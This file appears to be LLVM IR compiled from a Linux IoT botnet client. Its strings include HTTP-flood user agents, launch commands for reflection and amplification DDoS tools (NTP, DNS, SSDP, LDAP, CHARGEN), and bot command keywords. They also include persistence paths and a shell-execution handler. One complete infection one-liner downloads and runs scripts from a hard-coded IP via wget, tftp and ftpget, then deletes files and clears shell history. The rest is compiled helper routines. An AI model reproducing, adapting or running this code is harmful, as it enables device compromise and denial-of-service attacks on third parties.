@.str.488 = private unnamed_addr constant [208 x i8] c"HuaweiSymantecSpider/1.0+DSE-support@huaweisymantec.com+(compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR ; http://www.huaweisymantec.com/en/IRL/spider)\00", align 1
@.str.489 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620\00", align 1
@.str.490 = private unnamed_addr constant [106 x i8] c"Feedfetcher-Google; (+http://www.google.com/feedfetcher.html; 1 subscribers; feed-id=9422214874901413839)\00", align 1
@.str.491 = private unnamed_addr constant [72 x i8] c"Mozilla/5.0 (PlayStation 4 1.52) AppleWebKit/536.26 (KHTML, like Gecko)\00", align 1
@.str.492 = private unnamed_addr constant [134 x i8] c"Mozilla/5.0 (Linux; Android 4.2.2; AFTB Build/JDQ39) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.173 Mobile Safari/537.22\00", align 1
@.str.493 = private unnamed_addr constant [74 x i8] c"Mozilla/5.0 (PLAYSTATION 3 4.66) AppleWebKit/531.22.8 (KHTML, like Gecko)\00", align 1
@.str.494 = private unnamed_addr constant [22 x i8] c"Wget/1.12 (linux-gnu)\00", align 1
@.str.495 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\00", align 1
@.str.496 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\00", align 1
@.str.497 = private unnamed_addr constant [112 x i8] c"Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US\00", align 1
@.str.502 = private unnamed_addr constant [8 x i8] c"CHARGEN\00", align 1
@.str.503 = private unnamed_addr constant [40 x i8] c"cd; ./chargen %s %s chargen.txt 2 -1 %s\00", align 1
@.str.504 = private unnamed_addr constant [5 x i8] c"LDAP\00", align 1
@.str.505 = private unnamed_addr constant [34 x i8] c"cd; ./ldap %s %s ldap.txt 2 -1 %s\00", align 1
@.str.506 = private unnamed_addr constant [7 x i8] c"REAPER\00", align 1
@.str.507 = private unnamed_addr constant [30 x i8] c"./ldap %s %s ldap.txt 2 -1 %s\00", align 1
@.str.508 = private unnamed_addr constant [4 x i8] c"NTP\00", align 1
@.str.509 = private unnamed_addr constant [29 x i8] c"cd; ./ntp %s %s ntp.txt 2 %s\00", align 1
@.str.510 = private unnamed_addr constant [5 x i8] c"SSDP\00", align 1
@.str.511 = private unnamed_addr constant [34 x i8] c"cd; ./ssdp %s %s ssdp.txt 2 -1 %s\00", align 1
@.str.512 = private unnamed_addr constant [4 x i8] c"DNS\00", align 1
@.str.513 = private unnamed_addr constant [32 x i8] c"cd; ./dns %s %s dns.txt 2 -1 %s\00", align 1
@.str.514 = private unnamed_addr constant [4 x i8] c"TS3\00", align 1
@.str.515 = private unnamed_addr constant [44 x i8] c"cd; cd supreme; ./ts3 %s %s ts3.txt 2 -1 %s\00", align 1
@.str.516 = private unnamed_addr constant [439 x i8] c"cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;wget http://46.101.35.30/shitty.sh; chmod 777 shitty.sh; sh shitty.sh; tftp 46.101.35.30 -c get shtftp1.sh; chmod 777 shtftp1.sh; sh shtftp1.sh; tftp -r shtftp2.sh -g 46.101.35.30; chmod 777 shtftp2.sh; sh shtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 46.101.35.30 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf shitty.sh shtftp1.sh shtftp2.sh ftp1.sh; rm -rf *; history -c\00", align 1
@.str.517 = private unnamed_addr constant [4 x i8] c"%d\0A\00", align 1
@.str.518 = private unnamed_addr constant [6 x i8] c"TABLE\00", align 1
@.str.519 = private unnamed_addr constant [7 x i8] c"UPDATE\00", align 1
@.str.520 = private unnamed_addr constant [7 x i8] c"TELNET\00", align 1
@.str.521 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.522 = private unnamed_addr constant [21 x i8] c"HUMANS SHUTTING DOWN\00", align 1
@.str.523 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.524 = private unnamed_addr constant [47 x i8] c"\1B[0;36mHUMANS SEARCHING ON | IP: \1B[0;37m%s\1B[0m\00", align 1
@.str.525 = private unnamed_addr constant [23 x i8] c"IMAASSHOLETHATBOTKILLS\00", align 1
@.str.526 = private unnamed_addr constant [24 x i8] c"HUMANS KILLING | IP: %s\00", align 1
@.str.527 = private unnamed_addr constant [12 x i8] c"GETPUBLICIP\00", align 1
@.str.528 = private unnamed_addr constant [4 x i8] c"AMP\00", align 1
@.str.529 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.530 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.531 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.532 = private unnamed_addr constant [4 x i8] c"CNC\00", align 1
@.str.533 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.534 = private unnamed_addr constant [5 x i8] c"STOP\00", align 1
@.str.535 = private unnamed_addr constant [13 x i8] c"DDOS STOPPED\00", align 1
@.str.536 = private unnamed_addr constant [16 x i8] c"NO DDOS STOPPED\00", align 1
@.str.537 = private unnamed_addr constant [7 x i8] c"HAHANO\00", align 1
@.str.538 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.539 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.540 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.541 = private unnamed_addr constant [6 x i8] c"HUMAN\00", align 1
@.str.542 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.543 = private unnamed_addr constant [19 x i8] c"/etc/rc.d/rc.local\00", align 1
@.str.544 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.545 = private unnamed_addr constant [13 x i8] c"/etc/rc.conf\00", align 1
@.str.546 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.547 = private unnamed_addr constant [8 x i8] c"\22%s%s\22\0A\00", align 1
@.str.548 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.550 = private unnamed_addr constant [44 x i8] c"\1B[0;36mNEW %s CONNECTED | IP: \1B[0;37m%s\1B[0m\00", align 1
@.str.551 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.552 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.553 = private unnamed_addr constant [20 x i8] c"PEACE OUT IMMA DUP\0A\00", align 1
@.str.554 = private unnamed_addr constant [3 x i8] c"SH\00", align 1
@.str.555 = private unnamed_addr constant [8 x i8] c"%s 2>&1\00", align 1
@.str.556 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.557 = private unnamed_addr constant [2 x i8] c" \00", align 1
@GetRandomPublicIP.ipState.0 = internal unnamed_addr global i8 0, align 1
@GetRandomPublicIP.ipState.1 = internal unnamed_addr global i8 0, align 1
@GetRandomPublicIP.ipState.2 = internal unnamed_addr global i8 0, align 1
@GetRandomPublicIP.ipState.3 = internal unnamed_addr global i8 0, align 1

; Function Attrs: noinline norecurse nounwind uwtable
define void @init_rand(i32) local_unnamed_addr #0 {
  store i32 %0, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %2 = add i32 %0, -1640531527
  store i32 %2, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %3 = add i32 %0, 1013904242
  store i32 %3, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  br label %4

; <label>:4:                                      ; preds = %17, %1
  %indvars.iv = phi i64 [ 3, %1 ], [ %indvars.iv.next.1, %17 ]
  %5 = add nsw i64 %indvars.iv, -3
  %6 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %5
  %7 = load i32, i32* %6, align 4
  %8 = add nsw i64 %indvars.iv, -2
  %9 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %8
  %10 = load i32, i32* %9, align 4
  %11 = trunc i64 %indvars.iv to i32
  %12 = xor i32 %11, -1640531527
  %13 = xor i32 %12, %7
  %14 = xor i32 %13, %10
  %15 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %indvars.iv
  store i32 %14, i32* %15, align 4
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, 4096
  br i1 %exitcond, label %16, label %17

; <label>:16:                                     ; preds = %4
  ret void

; <label>:17:                                     ; preds = %4
  %18 = add nsw i64 %indvars.iv, -2
  %19 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %18
  %20 = load i32, i32* %19, align 4
  %21 = add nsw i64 %indvars.iv, -1
  %22 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %21
  %23 = load i32, i32* %22, align 4
  %24 = trunc i64 %indvars.iv.next to i32
  %25 = xor i32 %24, -1640531527
  %26 = xor i32 %25, %20
  %27 = xor i32 %26, %23
  %28 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %indvars.iv.next
  store i32 %27, i32* %28, align 4
  %indvars.iv.next.1 = add nsw i64 %indvars.iv, 2
  br label %4
}

; Function Attrs: noinline norecurse nounwind uwtable
define i32 @rand_cmwc() local_unnamed_addr #0 {
  %1 = load i32, i32* @rand_cmwc.i, align 4
  %2 = add i32 %1, 1
  %3 = and i32 %2, 4095
  store i32 %3, i32* @rand_cmwc.i, align 4
  %4 = zext i32 %3 to i64
  %5 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %4
  %6 = load i32, i32* %5, align 4
  %7 = zext i32 %6 to i64
  %8 = mul nuw nsw i64 %7, 18782
  %9 = load i32, i32* @c, align 4
  %10 = zext i32 %9 to i64
  %11 = add nuw nsw i64 %8, %10
  %12 = lshr i64 %11, 32
  %13 = trunc i64 %12 to i32
  %14 = add nuw nsw i64 %12, %11
  %15 = trunc i64 %14 to i32
  %16 = icmp ult i32 %15, %13
  %17 = zext i1 %16 to i32
  %storemerge = add nuw nsw i32 %17, %13
  store i32 %storemerge, i32* @c, align 4
  %.neg7 = sext i1 %16 to i32
  %.0.neg = sub i32 -2, %15
  %18 = add i32 %.0.neg, %.neg7
  %19 = load i32, i32* @rand_cmwc.i, align 4
  %20 = zext i32 %19 to i64
  %21 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %20
  store i32 %18, i32* %21, align 4
  ret i32 %18
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8* nocapture) local_unnamed_addr #1 {
  %2 = tail call i64 @strlen(i8* %0) #15
  %3 = add i64 %2, 4294967295
  br label %4

; <label>:4:                                      ; preds = %4, %1
  %indvars.iv29 = phi i64 [ %indvars.iv.next30, %4 ], [ 0, %1 ]
  %5 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv29
  %6 = load i8, i8* %5, align 1
  %7 = sext i8 %6 to i32
  %8 = tail call i32 @isspace(i32 %7) #15
  %9 = icmp eq i32 %8, 0
  %indvars.iv.next30 = add nuw i64 %indvars.iv29, 1
  br i1 %9, label %.preheader, label %4

.preheader:                                       ; preds = %4
  %10 = trunc i64 %3 to i32
  %11 = trunc i64 %indvars.iv29 to i32
  %12 = icmp slt i32 %10, %11
  br i1 %12, label %.critedge.preheader, label %.lr.ph22.preheader

.lr.ph22.preheader:                               ; preds = %.preheader
  %sext = shl i64 %3, 32
  %13 = ashr exact i64 %sext, 32
  %sext31 = shl i64 %indvars.iv29, 32
  %14 = ashr exact i64 %sext31, 32
  br label %.lr.ph22

.critedge.preheader.loopexit:                     ; preds = %.lr.ph22, %25
  %.0.lcssa.ph = phi i32 [ %24, %.lr.ph22 ], [ %26, %25 ]
  br label %.critedge.preheader

.critedge.preheader:                              ; preds = %.critedge.preheader.loopexit, %.preheader
  %.0.lcssa = phi i32 [ %10, %.preheader ], [ %.0.lcssa.ph, %.critedge.preheader.loopexit ]
  %15 = icmp sgt i32 %11, %.0.lcssa
  br i1 %15, label %.critedge._crit_edge, label %.critedge.preheader26

.critedge.preheader26:                            ; preds = %.critedge.preheader
  %sext32 = shl i64 %indvars.iv29, 32
  %16 = ashr exact i64 %sext32, 32
  %sext33 = shl i64 %indvars.iv29, 32
  %17 = ashr exact i64 %sext33, 32
  %18 = sext i32 %.0.lcssa to i64
  br label %.critedge

.lr.ph22:                                         ; preds = %.lr.ph22.preheader, %25
  %indvars.iv27 = phi i64 [ %13, %.lr.ph22.preheader ], [ %indvars.iv.next28, %25 ]
  %.021 = phi i32 [ %10, %.lr.ph22.preheader ], [ %26, %25 ]
  %19 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv27
  %20 = load i8, i8* %19, align 1
  %21 = sext i8 %20 to i32
  %22 = tail call i32 @isspace(i32 %21) #15
  %23 = icmp eq i32 %22, 0
  %24 = trunc i64 %indvars.iv27 to i32
  br i1 %23, label %.critedge.preheader.loopexit, label %25

; <label>:25:                                     ; preds = %.lr.ph22
  %indvars.iv.next28 = add nsw i64 %indvars.iv27, -1
  %26 = add nsw i32 %.021, -1
  %27 = icmp sgt i64 %indvars.iv27, %14
  br i1 %27, label %.lr.ph22, label %.critedge.preheader.loopexit

.critedge:                                        ; preds = %.critedge.preheader26, %.critedge
  %indvars.iv = phi i64 [ %16, %.critedge.preheader26 ], [ %indvars.iv.next, %.critedge ]
  %28 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %29 = load i8, i8* %28, align 1
  %30 = sub nsw i64 %indvars.iv, %17
  %31 = getelementptr inbounds i8, i8* %0, i64 %30
  store i8 %29, i8* %31, align 1
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %32 = icmp slt i64 %indvars.iv, %18
  br i1 %32, label %.critedge, label %.critedge._crit_edge.loopexit

.critedge._crit_edge.loopexit:                    ; preds = %.critedge
  br label %.critedge._crit_edge

.critedge._crit_edge:                             ; preds = %.critedge._crit_edge.loopexit, %.critedge.preheader
  %.019.lcssa = phi i64 [ %indvars.iv29, %.critedge.preheader ], [ %indvars.iv.next, %.critedge._crit_edge.loopexit ]
  %33 = sub i64 %.019.lcssa, %indvars.iv29
  %sext34 = shl i64 %33, 32
  %34 = ashr exact i64 %sext34, 32
  %35 = getelementptr inbounds i8, i8* %0, i64 %34
  store i8 0, i8* %35, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8* nocapture readonly, ...) local_unnamed_addr #1 {
  %2 = alloca [1 x %struct.__va_list_tag], align 16
  %3 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %2, i64 0, i64 0
  %4 = bitcast [1 x %struct.__va_list_tag]* %2 to i8*
  call void @llvm.va_start(i8* nonnull %4)
  %5 = call fastcc i32 @print(i8** null, i8* %0, %struct.__va_list_tag* nonnull %3)
  ret i32 %5
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #3

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @print(i8**, i8* nocapture readonly, %struct.__va_list_tag*) unnamed_addr #1 {
  %4 = alloca [2 x i8], align 1
  %5 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %6 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %7 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %8 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %9 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %10 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %11 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %12 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %13 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %14 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %15 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %16 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %17 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %18 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %19 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %20 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %21 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %22 = getelementptr inbounds [2 x i8], [2 x i8]* %4, i64 0, i64 0
  %23 = getelementptr inbounds [2 x i8], [2 x i8]* %4, i64 0, i64 1
  %24 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  br label %25

; <label>:25:                                     ; preds = %153, %3
  %.061 = phi i32 [ 0, %3 ], [ %.162, %153 ]
  %.0 = phi i8* [ %1, %3 ], [ %154, %153 ]
  %26 = load i8, i8* %.0, align 1
  switch i8 %26, label %149 [
    i8 0, label %155
    i8 37, label %27
  ]

; <label>:27:                                     ; preds = %25
  %28 = getelementptr inbounds i8, i8* %.0, i64 1
  %29 = load i8, i8* %28, align 1
  switch i8 %29, label %.preheader70 [
    i8 0, label %155
    i8 37, label %149
    i8 45, label %30
  ]

; <label>:30:                                     ; preds = %27
  %31 = getelementptr inbounds i8, i8* %.0, i64 2
  br label %.preheader70

.preheader70:                                     ; preds = %30, %27
  %.063.ph = phi i32 [ 0, %27 ], [ 1, %30 ]
  %.1.ph = phi i8* [ %28, %27 ], [ %31, %30 ]
  %32 = load i8, i8* %.1.ph, align 1
  %33 = icmp eq i8 %32, 48
  br i1 %33, label %.lr.ph.preheader, label %.preheader

.lr.ph.preheader:                                 ; preds = %.preheader70
  br label %.lr.ph

.preheader.loopexit:                              ; preds = %.lr.ph
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader70
  %.063.lcssa = phi i32 [ %.063.ph, %.preheader70 ], [ %37, %.preheader.loopexit ]
  %.1.lcssa = phi i8* [ %.1.ph, %.preheader70 ], [ %36, %.preheader.loopexit ]
  %34 = load i8, i8* %.1.lcssa, align 1
  %.off74 = add i8 %34, -48
  %35 = icmp ult i8 %.off74, 10
  br i1 %35, label %.lr.ph77.preheader, label %.critedge

.lr.ph77.preheader:                               ; preds = %.preheader
  br label %.lr.ph77

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.172 = phi i8* [ %36, %.lr.ph ], [ %.1.ph, %.lr.ph.preheader ]
  %.06371 = phi i32 [ %37, %.lr.ph ], [ %.063.ph, %.lr.ph.preheader ]
  %36 = getelementptr inbounds i8, i8* %.172, i64 1
  %37 = or i32 %.06371, 2
  %38 = load i8, i8* %36, align 1
  %39 = icmp eq i8 %38, 48
  br i1 %39, label %.lr.ph, label %.preheader.loopexit

.lr.ph77:                                         ; preds = %.lr.ph77.preheader, %.lr.ph77
  %40 = phi i8 [ %46, %.lr.ph77 ], [ %34, %.lr.ph77.preheader ]
  %.276 = phi i8* [ %45, %.lr.ph77 ], [ %.1.lcssa, %.lr.ph77.preheader ]
  %.06475 = phi i32 [ %44, %.lr.ph77 ], [ 0, %.lr.ph77.preheader ]
  %41 = zext i8 %40 to i32
  %42 = mul nsw i32 %.06475, 10
  %43 = add i32 %42, -48
  %44 = add i32 %43, %41
  %45 = getelementptr inbounds i8, i8* %.276, i64 1
  %46 = load i8, i8* %45, align 1
  %.off = add i8 %46, -48
  %47 = icmp ult i8 %.off, 10
  br i1 %47, label %.lr.ph77, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph77
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %.preheader
  %.064.lcssa = phi i32 [ 0, %.preheader ], [ %44, %.critedge.loopexit ]
  %.2.lcssa = phi i8* [ %.1.lcssa, %.preheader ], [ %45, %.critedge.loopexit ]
  %.lcssa = phi i8 [ %34, %.preheader ], [ %46, %.critedge.loopexit ]
  switch i8 %.lcssa, label %153 [
    i8 115, label %48
    i8 100, label %68
    i8 120, label %84
    i8 88, label %100
    i8 117, label %116
    i8 99, label %132
  ]

; <label>:48:                                     ; preds = %.critedge
  %49 = load i32, i32* %5, align 8
  %50 = icmp ult i32 %49, 41
  br i1 %50, label %51, label %56

; <label>:51:                                     ; preds = %48
  %52 = load i8*, i8** %6, align 8
  %53 = sext i32 %49 to i64
  %54 = getelementptr i8, i8* %52, i64 %53
  %55 = add i32 %49, 8
  store i32 %55, i32* %5, align 8
  br label %59

; <label>:56:                                     ; preds = %48
  %57 = load i8*, i8** %7, align 8
  %58 = getelementptr i8, i8* %57, i64 8
  store i8* %58, i8** %7, align 8
  br label %59

; <label>:59:                                     ; preds = %56, %51
  %.in69 = phi i8* [ %54, %51 ], [ %57, %56 ]
  %60 = bitcast i8* %.in69 to i32*
  %61 = load i32, i32* %60, align 4
  %62 = sext i32 %61 to i64
  %63 = inttoptr i64 %62 to i8*
  %64 = icmp ne i32 %61, 0
  %65 = select i1 %64, i8* %63, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.558, i64 0, i64 0)
  %66 = tail call fastcc i32 @prints(i8** %0, i8* %65, i32 %.064.lcssa, i32 %.063.lcssa)
  %67 = add nsw i32 %66, %.061
  br label %153

; <label>:68:                                     ; preds = %.critedge
  %69 = load i32, i32* %8, align 8
  %70 = icmp ult i32 %69, 41
  br i1 %70, label %71, label %76

; <label>:71:                                     ; preds = %68
  %72 = load i8*, i8** %9, align 8
  %73 = sext i32 %69 to i64
  %74 = getelementptr i8, i8* %72, i64 %73
  %75 = add i32 %69, 8
  store i32 %75, i32* %8, align 8
  br label %79

; <label>:76:                                     ; preds = %68
  %77 = load i8*, i8** %10, align 8
  %78 = getelementptr i8, i8* %77, i64 8
  store i8* %78, i8** %10, align 8
  br label %79

; <label>:79:                                     ; preds = %76, %71
  %.in68 = phi i8* [ %74, %71 ], [ %77, %76 ]
  %80 = bitcast i8* %.in68 to i32*
  %81 = load i32, i32* %80, align 4
  %82 = tail call fastcc i32 @printi(i8** %0, i32 %81, i32 10, i32 1, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %83 = add nsw i32 %82, %.061
  br label %153

; <label>:84:                                     ; preds = %.critedge
  %85 = load i32, i32* %11, align 8
  %86 = icmp ult i32 %85, 41
  br i1 %86, label %87, label %92

; <label>:87:                                     ; preds = %84
  %88 = load i8*, i8** %12, align 8
  %89 = sext i32 %85 to i64
  %90 = getelementptr i8, i8* %88, i64 %89
  %91 = add i32 %85, 8
  store i32 %91, i32* %11, align 8
  br label %95

; <label>:92:                                     ; preds = %84
  %93 = load i8*, i8** %13, align 8
  %94 = getelementptr i8, i8* %93, i64 8
  store i8* %94, i8** %13, align 8
  br label %95

; <label>:95:                                     ; preds = %92, %87
  %.in67 = phi i8* [ %90, %87 ], [ %93, %92 ]
  %96 = bitcast i8* %.in67 to i32*
  %97 = load i32, i32* %96, align 4
  %98 = tail call fastcc i32 @printi(i8** %0, i32 %97, i32 16, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %99 = add nsw i32 %98, %.061
  br label %153

; <label>:100:                                    ; preds = %.critedge
  %101 = load i32, i32* %14, align 8
  %102 = icmp ult i32 %101, 41
  br i1 %102, label %103, label %108

; <label>:103:                                    ; preds = %100
  %104 = load i8*, i8** %15, align 8
  %105 = sext i32 %101 to i64
  %106 = getelementptr i8, i8* %104, i64 %105
  %107 = add i32 %101, 8
  store i32 %107, i32* %14, align 8
  br label %111

; <label>:108:                                    ; preds = %100
  %109 = load i8*, i8** %16, align 8
  %110 = getelementptr i8, i8* %109, i64 8
  store i8* %110, i8** %16, align 8
  br label %111

; <label>:111:                                    ; preds = %108, %103
  %.in66 = phi i8* [ %106, %103 ], [ %109, %108 ]
  %112 = bitcast i8* %.in66 to i32*
  %113 = load i32, i32* %112, align 4
  %114 = tail call fastcc i32 @printi(i8** %0, i32 %113, i32 16, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 65)
  %115 = add nsw i32 %114, %.061
  br label %153

; <label>:116:                                    ; preds = %.critedge
  %117 = load i32, i32* %17, align 8
  %118 = icmp ult i32 %117, 41
  br i1 %118, label %119, label %124

; <label>:119:                                    ; preds = %116
  %120 = load i8*, i8** %18, align 8
  %121 = sext i32 %117 to i64
  %122 = getelementptr i8, i8* %120, i64 %121
  %123 = add i32 %117, 8
  store i32 %123, i32* %17, align 8
  br label %127

; <label>:124:                                    ; preds = %116
  %125 = load i8*, i8** %19, align 8
  %126 = getelementptr i8, i8* %125, i64 8
  store i8* %126, i8** %19, align 8
  br label %127

; <label>:127:                                    ; preds = %124, %119
  %.in65 = phi i8* [ %122, %119 ], [ %125, %124 ]
  %128 = bitcast i8* %.in65 to i32*
  %129 = load i32, i32* %128, align 4
  %130 = tail call fastcc i32 @printi(i8** %0, i32 %129, i32 10, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %131 = add nsw i32 %130, %.061
  br label %153

; <label>:132:                                    ; preds = %.critedge
  %133 = load i32, i32* %20, align 8
  %134 = icmp ult i32 %133, 41
  br i1 %134, label %135, label %140

; <label>:135:                                    ; preds = %132
  %136 = load i8*, i8** %21, align 8
  %137 = sext i32 %133 to i64
  %138 = getelementptr i8, i8* %136, i64 %137
  %139 = add i32 %133, 8
  store i32 %139, i32* %20, align 8
  br label %143

; <label>:140:                                    ; preds = %132
  %141 = load i8*, i8** %24, align 8
  %142 = getelementptr i8, i8* %141, i64 8
  store i8* %142, i8** %24, align 8
  br label %143

; <label>:143:                                    ; preds = %140, %135
  %.in = phi i8* [ %138, %135 ], [ %141, %140 ]
  %144 = bitcast i8* %.in to i32*
  %145 = load i32, i32* %144, align 4
  %146 = trunc i32 %145 to i8
  store i8 %146, i8* %22, align 1
  store i8 0, i8* %23, align 1
  %147 = call fastcc i32 @prints(i8** %0, i8* nonnull %22, i32 %.064.lcssa, i32 %.063.lcssa)
  %148 = add nsw i32 %147, %.061
  br label %153

; <label>:149:                                    ; preds = %27, %25
  %.3 = phi i8* [ %.0, %25 ], [ %28, %27 ]
  %150 = load i8, i8* %.3, align 1
  %151 = zext i8 %150 to i32
  tail call fastcc void @printchar(i8** %0, i32 %151)
  %152 = add nsw i32 %.061, 1
  br label %153

; <label>:153:                                    ; preds = %.critedge, %149, %143, %127, %111, %95, %79, %59
  %.162 = phi i32 [ %152, %149 ], [ %67, %59 ], [ %83, %79 ], [ %99, %95 ], [ %115, %111 ], [ %131, %127 ], [ %148, %143 ], [ %.061, %.critedge ]
  %.4 = phi i8* [ %.3, %149 ], [ %.2.lcssa, %59 ], [ %.2.lcssa, %79 ], [ %.2.lcssa, %95 ], [ %.2.lcssa, %111 ], [ %.2.lcssa, %127 ], [ %.2.lcssa, %143 ], [ %.2.lcssa, %.critedge ]
  %154 = getelementptr inbounds i8, i8* %.4, i64 1
  br label %25

; <label>:155:                                    ; preds = %27, %25
  %156 = icmp eq i8** %0, null
  br i1 %156, label %159, label %157

; <label>:157:                                    ; preds = %155
  %158 = load i8*, i8** %0, align 8
  store i8 0, i8* %158, align 1
  br label %159

; <label>:159:                                    ; preds = %155, %157
  %160 = bitcast %struct.__va_list_tag* %2 to i8*
  tail call void @llvm.va_end(i8* %160)
  ret i32 %.061
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @prints(i8**, i8* nocapture readonly, i32, i32) unnamed_addr #1 {
  %5 = icmp sgt i32 %2, 0
  br i1 %5, label %.preheader37, label %.thread.preheader

.preheader37:                                     ; preds = %4
  %6 = load i8, i8* %1, align 1
  %7 = icmp eq i8 %6, 0
  br i1 %7, label %._crit_edge48, label %.lr.ph47.preheader

.lr.ph47.preheader:                               ; preds = %.preheader37
  br label %.lr.ph47

.lr.ph47:                                         ; preds = %.lr.ph47.preheader, %.lr.ph47
  %.046 = phi i8* [ %9, %.lr.ph47 ], [ %1, %.lr.ph47.preheader ]
  %.02745 = phi i32 [ %8, %.lr.ph47 ], [ 0, %.lr.ph47.preheader ]
  %8 = add nuw nsw i32 %.02745, 1
  %9 = getelementptr inbounds i8, i8* %.046, i64 1
  %10 = load i8, i8* %9, align 1
  %11 = icmp eq i8 %10, 0
  br i1 %11, label %._crit_edge48.loopexit, label %.lr.ph47

._crit_edge48.loopexit:                           ; preds = %.lr.ph47
  br label %._crit_edge48

._crit_edge48:                                    ; preds = %._crit_edge48.loopexit, %.preheader37
  %.027.lcssa = phi i32 [ 0, %.preheader37 ], [ %8, %._crit_edge48.loopexit ]
  %12 = icmp slt i32 %.027.lcssa, %2
  %13 = sub nsw i32 %2, %.027.lcssa
  %.031 = select i1 %12, i32 %13, i32 0
  %14 = shl i32 %3, 3
